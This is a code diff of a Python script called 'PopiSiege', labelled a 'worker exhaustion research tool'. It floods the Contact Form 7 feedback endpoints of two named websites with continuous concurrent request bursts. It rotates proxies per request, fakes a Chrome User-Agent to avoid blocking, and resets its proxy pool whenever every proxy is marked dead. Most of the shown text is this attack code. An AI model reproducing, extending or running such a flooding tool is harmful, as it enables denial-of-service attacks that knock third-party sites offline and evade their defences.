@@ -4,7 +4,6 @@ PopiSiege VPS Edition
 CF7 Worker Exhaustion Research Tool
 Runs continuously until Ctrl+C
 Proxy rotation per request — browser User-Agent
-Auto-refreshes proxy pool when alive drops below 50%
 
 Usage:
   python3 popisiege.py
@@ -13,11 +12,10 @@ Usage:
   python3 popisiege.py --help
 """
 
-import requests, time, sys, argparse
+import requests, time, sys, threading, itertools, argparse, subprocess
 import os
 from concurrent.futures import ThreadPoolExecutor, as_completed
 from datetime import datetime
-from proxy_pool import ProxyPool
 
 G = "\033[0;32m"; R = "\033[0;31m"; Y = "\033[0;33m"
 C = "\033[0;36m"; W = "\033[0m";    B = "\033[1m"
@@ -31,21 +29,62 @@ BROWSER_UA = (
 SCRIPT_DIR = os.path.dirname(os.path.abspath(__file__))
 PROXY_FILE = os.path.join(SCRIPT_DIR, "proxies.txt")
 
-# ── known targets ──────────────────────────────────────────────────────────
+# ── known targets ─────────────────────────────────────────────────────────────
 TARGETS = {
     "metoo-shatkin.com": {
-        "url":       "https://metoo-shatkin.com/wp-json/contact-form-7/v1/contact-forms/50/feedback",
-        "form_id":   "50",
-        "unit_tag":  "wpcf7-f50-p30-o1",
+        "url":      "https://metoo-shatkin.com/wp-json/contact-form-7/v1/contact-forms/50/feedback",
+        "form_id":  "50",
+        "unit_tag": "wpcf7-f50-p30-o1",
         "threshold": 19,
     },
     "metoo-buffalo.com": {
-        "url":       "https://metoo-buffalo.com/wp-json/contact-form-7/v1/contact-forms/248/feedback",
-        "form_id":   "248",
-        "unit_tag":  "wpcf7-f248-p850-o1",
+        "url":      "https://metoo-buffalo.com/wp-json/contact-form-7/v1/contact-forms/248/feedback",
+        "form_id":  "248",
+        "unit_tag": "wpcf7-f248-p850-o1",
         "threshold": 25,
     },
 }
+
+
+# ─────────────────────────────────────────────────────────────────────────────
+#  PROXY POOL
+# ─────────────────────────────────────────────────────────────────────────────
+
+class ProxyPool:
+    def __init__(self, path):
+        with open(path) as f:
+            raw = [l.strip() for l in f if l.strip()]
+        self.proxies = [
+            p if p.startswith(("http","socks")) else f"http://{p}"
+            for p in raw
+        ]
+        self._cycle = itertools.cycle(self.proxies)
+        self._lock  = threading.Lock()
+        self._dead  = set()
+        print(f"  {G}[PROXY]{W} {len(self.proxies)} proxies loaded from {path}")
+
+    def next(self):
+        with self._lock:
+            for _ in range(len(self.proxies)):
+                p = next(self._cycle)
+                if p not in self._dead:
+                    return p
+        return None
+
+    def mark_dead(self, proxy):
+        with self._lock:
+            self._dead.add(proxy)
+
+    def alive(self):
+        return len(self.proxies) - len(self._dead)
+
+    def refresh(self, proxy_file):
+        """Reset dead set and cycle through bundled proxies again."""
+        print(f"\n  {Y}[PROXY]{W} Pool exhausted — resetting and cycling through proxies again...\n")
+        with self._lock:
+            self._dead  = set()
+            self._cycle = itertools.cycle(self.proxies)
+        print(f"\n  {G}[PROXY]{W} Reset — {len(self.proxies)} proxies back in rotation.\n")
 
 
 # ─────────────────────────────────────────────────────────────────────────────
@@ -106,7 +145,7 @@ def burst(concurrency, cfg, pool, verbose):
             else:
                 err.append(code)
             if verbose:
-                sym    = G+"[✓]"+W if code==200 else R+"[✗]"+W
+                sym = G+"[✓]"+W if code==200 else R+"[✗]"+W
                 detail = f"HTTP={code or 'ERR':<3} | Time={elapsed:.2f}s | Cache={cache}"
                 if error: detail += f" | {error}"
                 print(f"    {sym} Req {num:>3} | {short:<22} | {detail}")
@@ -134,17 +173,18 @@ def main():
                    help="Seconds between bursts (default: 0)")
     args = p.parse_args()
 
-    # ── resolve target ─────────────────────────────────────────────────────
+    # ── resolve target ────────────────────────────────────────────────────────
     domain = args.target.replace("https://","").replace("http://","").strip("/")
     if domain not in TARGETS:
         print(f"\n  {R}[ERROR]{W} Unknown target: {domain}")
         print(f"  Known: {', '.join(TARGETS)}\n")
+        print(f"  To add a new target, use: --target <domain>")
         sys.exit(1)
 
     cfg         = TARGETS[domain]
     concurrency = args.concurrency or cfg["threshold"]
 
-    # ── load proxies ───────────────────────────────────────────────────────
+    # ── load proxies ──────────────────────────────────────────────────────────
     try:
         pool = ProxyPool(args.proxy_file)
     except FileNotFoundError:
@@ -161,12 +201,12 @@ def main():
   Unit Tag    : {cfg['unit_tag']}
   Concurrency : {concurrency} per burst  (threshold = {cfg['threshold']})
   Proxies     : {pool.alive()} alive — rotating per request
-  Auto-refresh: ON — triggers when alive drops below 50%
   User-Agent  : Chrome/124 (browser)
   Mode        : Continuous until Ctrl+C
 {B}{'='*66}{W}
 """)
 
+    # ── stats ─────────────────────────────────────────────────────────────────
     total_ok  = 0
     total_err = 0
     burst_num = 0
@@ -180,8 +220,7 @@ def main():
 
             if not args.verbose:
                 print(f"  {C}[Burst {burst_num:>4}]{W} {ts} | "
-                      f"alive={pool.alive()}/{len(pool.proxies)} | "
-                      f"sending {concurrency}...",
+                      f"Proxies alive={pool.alive()} | Sending {concurrency}...",
                       end="", flush=True)
 
             ok, err, times = burst(concurrency, cfg, pool, args.verbose)
@@ -203,16 +242,14 @@ def main():
                       f"OK={len(ok)}/{concurrency} | "
                       f"Avail={avail:>5.1f}% | "
                       f"Avg={avg_t:.2f}s | "
-                      f"alive={pool.alive()}/{len(pool.proxies)} | "
                       f"Status={status} | "
                       f"Runtime={run_t:.0f}s")
             else:
                 print(f"\n  {C}[Burst {burst_num}]{W} OK={len(ok)}/{concurrency} | "
-                      f"Avail={avail:.1f}% | Avg={avg_t:.2f}s | "
-                      f"alive={pool.alive()}/{len(pool.proxies)} | {status}\n")
+                      f"Avail={avail:.1f}% | Avg={avg_t:.2f}s | {status}\n")
 
-            # auto-refresh when alive drops below 50%
-            pool.maybe_refresh()
+            if pool.alive() == 0:
+                pool.refresh(args.proxy_file)
 
             if args.delay > 0:
                 time.sleep(args.delay)
@@ -220,7 +257,7 @@ def main():
     except KeyboardInterrupt:
         print(f"\n\n  {Y}[STOPPED]{W} Ctrl+C received.\n")
 
-    # ── final report ───────────────────────────────────────────────────────
+    # ── final report ──────────────────────────────────────────────────────────
     runtime = time.time() - start
     total   = total_ok + total_err
 
